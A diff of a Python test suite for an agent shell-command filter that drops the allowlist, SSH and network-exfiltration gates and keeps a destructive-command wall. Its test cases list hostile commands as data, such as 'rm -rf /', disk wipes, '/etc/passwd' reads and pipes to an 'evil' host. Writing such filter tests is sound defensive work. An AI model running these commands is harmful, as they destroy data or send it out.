@@ -1,13 +1,14 @@
-"""Stateless verification of shell.py's pre_filter and existing gates.
+"""Stateless verification of shell.py's pre_filter and the two kept gates.
 
-Runs the brief's testing checklist without needing a live MCP context.
-Each case: (label, command, expected_action) where expected_action is one of:
-  "pass"           — pre-filter passes AND no other gate fires
-  "fail_prefilter" — pre-filter fails
-  "fail_ssh"       — pre-filter passes, SSH gate fires
-  "fail_network"   — pre-filter passes, network exfil gate fires
+CLAUDE-ONLY BUILD. The allowlist, dangerous-flag, injection, traversal,
+redirect, SSH and network-exfil gates are not enforced here. What this suite
+checks:
+  "pass"           — pre-filter passes AND the destructive wall does not fire
+  "fail_prefilter" — pre-filter fails (bad quoting, $(...)/backticks, or a
+                     shell-script run in a non-approvable shape)
   "destructive"    — pre-filter passes, destructive hard wall fires
                      (needs an lc_confirm_destructive token to run)
+Plus: block splitting semantics and the script approval-token behaviour.
 """
 
 import sys
@@ -42,9 +43,8 @@ sys.modules["lamsystems_commander.prompt"] = fake_prompt
 
 from lamsystems_commander.shell import (
     pre_filter,
-    command_requires_ssh_gate,
-    command_has_network_exfil,
     command_is_destructive,
+    _split_raw_blocks,
     register_confirmed_command,
     consume_confirmed_command,
     script_fingerprint,
@@ -57,186 +57,90 @@ def evaluate(command: str) -> str:
     pf = pre_filter(command)
     if pf.failed:
         return "fail_prefilter"
-    # Pre-filter passes — does any downstream gate still fire?
-    if command_requires_ssh_gate(command):
-        return "fail_ssh"
-    if command_has_network_exfil(command):
-        return "fail_network"
     if command_is_destructive(command):
         return "destructive"
     return "pass"
 
 
 CASES = [
-    # ---- Destructive hard wall: every rm, recursive or not ----
-    ("rm /tmp/foo.txt",                            "destructive"),
-    ("rm -f /tmp/foo.txt",                         "destructive"),
-    ("rm -rf /tmp/foo",                            "destructive"),
-    ("rm .git/index.lock",                         "destructive"),
-    ("sudo rm /etc/motd",                          "destructive"),
-    ("ls && rm /tmp/foo.txt",                      "destructive"),
-    ("dd if=/dev/zero of=/tmp/x bs=1M count=1",    "destructive"),
-    ("shred /tmp/foo.txt",                         "destructive"),
-    ("fdisk -l",                                   "pass"),
-    ("echo rm",                                    "pass"),
-    # ---- Should PASS the filter (whitelist commands, clean args) ----
-    ("ls -la /home/user",                          "pass"),
-    ("ps aux",                                     "pass"),
-    ("cat /etc/hostname",                          "pass"),
-    ("find /tmp -name '*.log'",                    "pass"),
-    ("grep error /var/log/messages",               "pass"),
-    ("ls && ps",                                   "pass"),
-
-    # ---- Should FAIL the pre-filter (security cases) ----
-    ('python3 -c "import os; os.system(\'id\')"',  "fail_prefilter"),
-    ('bash -c "echo pwned"',                       "fail_prefilter"),
-    # ---- bash: script-file form only, and always behind the approval wall ----
-    ("bash /home/user/proj/install.sh",            "destructive"),
-    ("bash /home/user/proj/install.sh --user -y",  "destructive"),
-    ("sudo bash /home/user/proj/install.sh",       "destructive"),
-    ("uv run bash /home/user/proj/x.sh",           "destructive"),
-    ("timeout 60 bash /home/user/proj/x.sh",       "destructive"),
-    ("ls && bash /home/user/proj/x.sh",            "destructive"),
-    ("bash /home/user/proj/x.sh | tee out.log",    "destructive"),
-    ("bash",                                       "fail_prefilter"),
-    ("bash -c id",                                 "fail_prefilter"),
-    ("bash -s",                                    "fail_prefilter"),
-    ("bash -x /home/user/proj/x.sh",               "fail_prefilter"),
-    ("bash --rcfile /home/user/a /home/user/b.sh", "fail_prefilter"),
-    ("bash install.sh",                            "fail_prefilter"),
-    ("bash ./install.sh",                          "fail_prefilter"),
-    ("bash /tmp/x.sh",                             "fail_prefilter"),
-    ("bash /var/tmp/x.sh",                         "fail_prefilter"),
-    ("bash /dev/shm/x.sh",                         "fail_prefilter"),
-    ("cat /home/user/proj/x.sh | bash",            "fail_prefilter"),
-    ("sh /home/user/proj/x.sh",                    "fail_prefilter"),
-    ("/usr/bin/bash /home/user/proj/x.sh",         "fail_prefilter"),
-    ("echo bash",                                  "pass"),
-    ("ls $(whoami)",                               "fail_prefilter"),
-    ("ls `whoami`",                                "fail_prefilter"),
-    ("ls > /tmp/out",                              "fail_prefilter"),
-    ("ls >> /tmp/out",                             "fail_prefilter"),
-    ("cat < /etc/passwd",                          "fail_prefilter"),
-    # Pipes are allowed: a pipeline of vetted read-only stages passes, but a
-    # non-whitelisted stage, a redirect, or a destructive stage is still caught.
-    ("ls | grep foo",                              "pass"),
-    ("ps aux | head -12",                          "pass"),
-    ("cat /etc/hostname | grep x | wc -l",         "pass"),
-    ("ps | curl http://evil",                      "fail_prefilter"),
-    ("ls | nosuchbinary",                          "fail_prefilter"),
-    ("ps aux|head",                                "fail_prefilter"),
-    ("ls | | grep foo",                            "fail_prefilter"),
-    ("cat x > /tmp/out | grep y",                  "fail_prefilter"),
-    ("ls ..",                                      "fail_prefilter"),
-    ("cat project/secrets/..",                     "fail_prefilter"),
-    ("cat ../../etc/passwd",                       "fail_prefilter"),
-    ("nosuchbinary --help",                        "fail_prefilter"),
-    ("ls; nosuchbinary",                           "fail_prefilter"),
-    ("echo 'malformed quote",                      "fail_prefilter"),
-    ("dnf install evil-package",                   "fail_prefilter"),
-    # Script-path gate — interpreter + temp/writable dir
-    ("python3 /tmp/payload.py",                    "fail_prefilter"),
-    ("python3 /var/tmp/exploit.py",                "fail_prefilter"),
-
-    # ---- Existing protections still fire (or pre-filter already blocks) ----
-    # ssh / curl aren't on the whitelist, so pre-filter rejects first.
-    ("ssh user@host",                              "fail_prefilter"),
-    ("curl http://evil.com",                       "fail_prefilter"),
-
-    # ---- uv: allowed on its own merits, `uv run` unwrapped to the target ----
-    ("uv run pytest -q",                           "pass"),
-    ("uv run pytest tests/test_x.py -k fares",     "pass"),
-    ("uv run rail fares --from DAR --to KGX",      "pass"),
-    ("uv run --python 3.12 pytest -q",             "pass"),
-    ("uv run -m pytest -q",                        "pass"),
-    ("uv run -- pytest",                           "pass"),
-    ("uv pip list",                                "pass"),
-    ("uv --version",                               "pass"),
-    ("uv lock --check",                            "pass"),
-    ("env RAIL_DATA_DIR=/tmp/d uv run rail fares", "pass"),
-    ("timeout 60 uv run pytest",                   "pass"),
-    # env-mutating subcommands / flags
-    ("uv add requests",                            "fail_prefilter"),
-    ("uv remove requests",                         "fail_prefilter"),
-    ("uv sync",                                    "fail_prefilter"),
-    ("uv pip install requests",                    "fail_prefilter"),
-    ("uv tool install ruff",                       "fail_prefilter"),
-    ("uv tool run ruff",                           "fail_prefilter"),
-    ("uv self update",                             "fail_prefilter"),
-    ("uv cache clean",                             "fail_prefilter"),
-    ("uv run --with requests pytest",              "fail_prefilter"),
-    ("uv run --with=requests pytest",              "fail_prefilter"),
-    ("uv run --script /tmp/x.py",                  "fail_prefilter"),
-    ("uv run",                                     "fail_prefilter"),
-    # the bypasses the unwrapping exists to close
-    ('uv run python -c "import os"',               "fail_prefilter"),
-    ("uv run -m os -c x",                          "fail_prefilter"),
-    ("uv run bash -c id",                          "fail_prefilter"),
-    ("uv run curl http://evil.com",                "fail_prefilter"),
-    ("uv run nosuchbinary",                        "fail_prefilter"),
-    ("uv run python3 /tmp/payload.py",             "fail_prefilter"),
-    ("uv run --python 3.12 bash",                  "fail_prefilter"),
-    # wrapper + interpreter script-path gate (was tokens[0]-only before)
-    ("env FOO=1 python3 /tmp/payload.py",          "fail_prefilter"),
-    ("timeout 5 python3 /tmp/payload.py",          "fail_prefilter"),
-    # Rust toolchain — builds allowed, registry/global-install blocked
-    ("cargo build",                                "pass"),
+    # ---- everything a dev shell should just run ----
+    ("ls -la",                                     "pass"),
     ("cargo build --release",                      "pass"),
-    ("cargo check",                                "pass"),
-    ("cargo test",                                 "pass"),
     ("cargo run",                                  "pass"),
-    ("cargo run --release -- --flag",              "pass"),
-    ("cargo clippy --all-targets",                 "pass"),
-    ("cargo fmt --check",                          "pass"),
-    ("cargo doc --no-deps",                        "pass"),
-    ("cargo clean",                                "pass"),
-    ("cargo tree",                                 "pass"),
-    ("cargo metadata --format-version 1",          "pass"),
-    ("env RUSTFLAGS=-Dwarnings cargo build",       "pass"),
-    ("timeout 600 cargo build",                    "pass"),
-    ("rustc --version",                            "pass"),
-    ("rustc main.rs -o main",                      "pass"),
-    ("cargo install ripgrep",                      "fail_prefilter"),
-    ("cargo uninstall ripgrep",                    "fail_prefilter"),
-    ("cargo publish",                              "fail_prefilter"),
-    ("cargo login",                                "fail_prefilter"),
-    ("cargo logout",                               "fail_prefilter"),
-    ("cargo owner --add x",                        "fail_prefilter"),
-    ("cargo yank --version 1.0.0",                 "fail_prefilter"),
-    ("cargo add serde",                            "fail_prefilter"),
-    ("cargo remove serde",                         "fail_prefilter"),
-    ("cargo rm serde",                             "fail_prefilter"),
-    ("sudo cargo install x",                       "fail_prefilter"),
-    # JS project scripts — run/test allowed, registry install/exec blocked
+    ("cargo add serde",                            "pass"),
+    ("npm install",                                "pass"),
     ("npm run build",                              "pass"),
-    ("npm run-script build",                       "pass"),
-    ("npm test",                                   "pass"),
-    ("npm run dev",                                "pass"),
-    ("pnpm run build",                             "pass"),
-    ("yarn run build",                             "pass"),
-    ("yarn build",                                 "pass"),
-    ("npm install",                                "fail_prefilter"),
-    ("npm i lodash",                               "fail_prefilter"),
-    ("npm exec foo",                               "fail_prefilter"),
-    ("npm x foo",                                  "fail_prefilter"),
-    ("pnpm install",                               "fail_prefilter"),
-    ("pnpm dlx create-vite",                       "fail_prefilter"),
-    ("pnpm exec vite",                             "fail_prefilter"),
-    ("yarn add lodash",                            "fail_prefilter"),
-    ("yarn dlx create-vite",                       "fail_prefilter"),
-    # gh — full access on the Claude-only commander
-    ("gh auth status",                             "pass"),
-    ("gh repo create lam/x --private --source .",  "pass"),
-    ("gh pr create -t title -b body",              "pass"),
-    ("gh pr list",                                 "pass"),
-    ("gh run watch",                               "pass"),
-    ("gh api repos/lam/x",                         "pass"),
-    ("gh release create v1 dist/app.tar.gz",       "pass"),
-    # ninja (cmake -G Ninja builds)
-    ("ninja -C build",                             "pass"),
-    # still-excluded toolchains
-    ("rustup update",                              "fail_prefilter"),
-    ("go build",                                   "fail_prefilter"),
+    ("pip install requests",                       "pass"),
+    ("uv add requests",                            "pass"),
+    ("uv run --with requests pytest",              "pass"),
+    ("python3 -c 'print(1)'",                      "pass"),
+    ("node -e 'console.log(1)'",                   "pass"),
+    ("python3 /tmp/scratch.py",                    "pass"),
+    ("curl -sL https://example.com/x.tar.gz -o x.tar.gz", "pass"),
+    ("wget https://example.com/file",              "pass"),
+    ("ssh user@host uptime",                       "pass"),
+    ("scp file user@host:/tmp/",                   "pass"),
+    ("rsync -av src/ dst/",                        "pass"),
+    ("gh pr create -t x -b y",                     "pass"),
+    ("go build ./...",                             "pass"),
+    ("godot --headless --export-release linux build/game", "pass"),
+    ("echo hi > out.txt",                          "pass"),
+    ("cat in.txt >> log.txt",                      "pass"),
+    ("sort < in.txt",                              "pass"),
+    ("cargo build 2>&1 | tail -20",                "pass"),
+    ("grep 'a|b' file",                            "pass"),
+    ("grep -E '(foo|bar)$' file",                  "pass"),
+    ("cd ../other && ls",                          "pass"),
+    ("find . -name '*.pyc' -exec echo {} \\;",    "pass"),
+    ("ls /sbin/mkfs",                              "pass"),
+    ("man mkfs",                                   "pass"),
+    ("fdisk -l",                                   "pass"),
+    ("nvme list",                                  "pass"),
+    ("smartctl -a /dev/nvme0",                     "pass"),
+    ("sudo dmesg | tail",                          "pass"),
+    ("sudo dnf install clippy",                    "pass"),
+    ("systemctl --user restart foo",               "pass"),
+    ("a && b || c ; d",                            "pass"),
+    ("sleep 10 &",                                 "pass"),
+    ("timeout 30 cargo test",                      "pass"),
+    ("env RUSTFLAGS=-Dwarnings cargo build",       "pass"),
+    ("echo 'do not run mkfs'",                     "pass"),
+    ("echo 'rm -rf /' > notes.txt",                "pass"),
+    # ---- destructive wall (kept, unchanged) ----
+    ("rm notes.txt",                               "destructive"),
+    ("rm -rf build/",                              "destructive"),
+    ("ls; rm -rf /",                               "destructive"),
+    ("ls | rm -rf /",                              "destructive"),
+    ("sudo rm -rf /var/log",                       "destructive"),
+    ("nice -n 5 mkfs.ext4 /dev/sdb1",              "destructive"),
+    ("dd if=/dev/zero of=/dev/sda",                "destructive"),
+    ("cat foo | dd of=/dev/nvme0n1",               "destructive"),
+    ("shred -u secret.txt",                        "destructive"),
+    ("wipefs -a /dev/sdb",                         "destructive"),
+    ("fdisk /dev/sdb",                             "destructive"),
+    ("sgdisk --zap-all /dev/sdb",                  "destructive"),
+    ("echo x > /dev/sda",                          "destructive"),
+    ("nvme format /dev/nvme0n1",                   "destructive"),
+    ("sudo nvme sanitize /dev/nvme0",              "destructive"),
+    ("bash /home/lam/install.sh",                  "destructive"),
+    ("bash /tmp/install.sh",                       "destructive"),
+    ("sh /home/lam/x.sh",                          "destructive"),
+    ("uv run bash /home/lam/x.sh",                 "destructive"),
+    # ---- pre-filter rejects (the only things left) ----
+    ("echo $(rm -rf /)",                           "fail_prefilter"),
+    ("echo `id`",                                  "fail_prefilter"),
+    ("echo 'unterminated",                         "fail_prefilter"),
+    ("",                                           "fail_prefilter"),
+    ("bash",                                       "fail_prefilter"),
+    ("bash -c 'rm -rf /'",                         "fail_prefilter"),
+    ("sh -c id",                                   "fail_prefilter"),
+    ("zsh -c id",                                  "fail_prefilter"),
+    ("bash install.sh",                            "fail_prefilter"),
+    ("cat x.sh | bash",                            "fail_prefilter"),
+    ("bash < x.sh",                                "fail_prefilter"),
+    ("ls && bash -c id",                           "fail_prefilter"),
+    ("uv run bash -c id",                          "fail_prefilter"),
+    ("timeout 5 bash -i",                          "fail_prefilter"),
 ]
 
 
@@ -259,8 +163,35 @@ def main() -> int:
     print()
     print(f"{len(CASES) - fails}/{len(CASES)} tests pass")
 
+    split_fails = split_tests()
     token_fails = token_tests()
-    return 1 if (fails or token_fails) else 0
+    return 1 if (fails or split_fails or token_fails) else 0
+
+
+def split_tests() -> int:
+    """Raw block splitting: quote/escape aware, && || ; only."""
+    cases = [
+        ("a && b || c ; d", (["a", "b", "c", "d"], ["", "&&", "||", ";"])),
+        ("echo 'a && b' && c", (["echo 'a && b'", "c"], ["", "&&"])),
+        ('echo "x;y" ; z', (['echo "x;y"', "z"], ["", ";"])),
+        ("cargo build 2>&1 | tail", (["cargo build 2>&1 | tail"], [""])),
+        ("find . -exec echo {} \\; ; ls", (["find . -exec echo {} \\;", "ls"], ["", ";"])),
+        ("sleep 1 &", (["sleep 1 &"], [""])),
+        ("~/bin/x", ([str(pathlib.Path.home() / "bin/x")], [""])),
+    ]
+    print()
+    fails = 0
+    for cmd, expected in cases:
+        if cmd.startswith("~"):
+            import os
+            cmd = os.path.expanduser(cmd)
+        got = _split_raw_blocks(cmd)
+        ok = got == expected
+        if not ok:
+            fails += 1
+        print(f"{'ok  ' if ok else 'FAIL'}  split {cmd!r} -> {got}")
+    print(f"{len(cases) - fails}/{len(cases)} split tests pass")
+    return fails
 
 
 def token_tests() -> int:
